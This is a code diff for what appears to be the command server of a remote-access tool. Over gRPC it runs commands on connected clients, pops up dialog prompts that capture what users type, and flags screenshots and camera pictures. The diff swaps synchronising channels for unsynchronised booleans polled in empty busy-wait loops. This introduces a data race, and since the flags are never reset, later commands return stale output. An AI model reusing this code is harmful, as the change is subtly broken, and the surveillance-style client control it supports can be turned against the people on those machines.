@@ -62,8 +62,8 @@ var client_dialogoutput map[string]string = make(map[string]string)
 var should_screenshot bool = false
 var should_takepic bool = false
 
-var exec_done chan bool
-var dialog_done chan bool
+var exec_done bool
+var dialog_done bool
 
 var (
 	history_fn = filepath.Join(os.TempDir(), ".liner_history")
@@ -387,7 +387,8 @@ func main() {
 
 				client_execcommand[current_id] = strings.Join(fields[1:], " ")
 
-				<-exec_done
+				for !exec_done {
+				}
 				log.Println(client_execoutput[current_id])
 
 			case "dialog":
@@ -413,7 +414,8 @@ func main() {
 				}
 
 				dialog_params = &DialogParams{ShouldUpdate: true, DialogPrompt: matches[0], DialogTitle: matches[1]}
-				<-dialog_done
+				for !dialog_done {
+				}
 				log.Println(client_dialogoutput[current_id])
 
 			case "clear":
@@ -521,7 +523,7 @@ func (s *server) SetCommandOutput(ctx context.Context, in *pb.ClientExecOutput) 
 		if id.ClientId == current_id {
 			client_execoutput[current_id] = ""
 			client_execoutput[current_id] = string(in.GetOutput())
-			exec_done <- true
+			exec_done = true
 		}
 	}
 
@@ -589,7 +591,7 @@ func (s *server) SetDialogOutput(ctx context.Context, in *pb.DialogOutput) (*pb.
 		}
 	}
 
-	dialog_done <- true
+	dialog_done = true
 
 	return &pb.Void{}, nil
 }
